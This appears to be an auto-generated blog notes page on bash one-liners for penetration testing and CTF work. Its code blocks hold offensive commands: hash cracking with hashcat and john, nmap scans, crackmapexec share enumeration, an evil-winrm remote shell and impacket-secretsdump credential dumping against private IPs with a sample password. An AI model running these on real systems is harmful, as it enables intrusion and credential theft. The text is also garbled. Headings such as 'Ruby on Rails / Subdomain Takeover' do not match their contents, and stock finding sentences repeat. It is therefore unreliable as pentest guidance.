---
TitleSEO: "Bash One-Liners for Security Testing | ZureFX"
TitlePost: "Bash One-Liners for Security Testing"
Author: "ZureFX"
Description: "Personal notes on Bash One-Liners for Security Testing. Quick reference for pentesting and CTF challenges."
Keywords: "enumeration, linux, cheatsheet, lateral movement, privilege escalation, dfir"
URL: "https://zurefx.github.io/notes/note-bash-one-liners-for-security-testing-889.html"
URL_IMAGES: ""
Date: "2025-08-06"
Tags: "Enumeration, Linux, Cheatsheet, Lateral Movement, Privilege Escalation, DFIR"
Section: "notes"
Lang: "en"
main_img: "note-bash-one-liners-for-security-testing-889"
Permalink: "/notes/note-bash-one-liners-for-security-testing-889.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Ruby on Rails

### Subdomain Takeover

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p25,443,995 10.54.251.199 -oN scan.txt
crackmapexec smb 10.92.132.43 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## MySQL

### psexec

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

## hydra

### SNMP

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
crackmapexec smb 10.82.4.115 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.92.242.127 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.120.182
```

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.
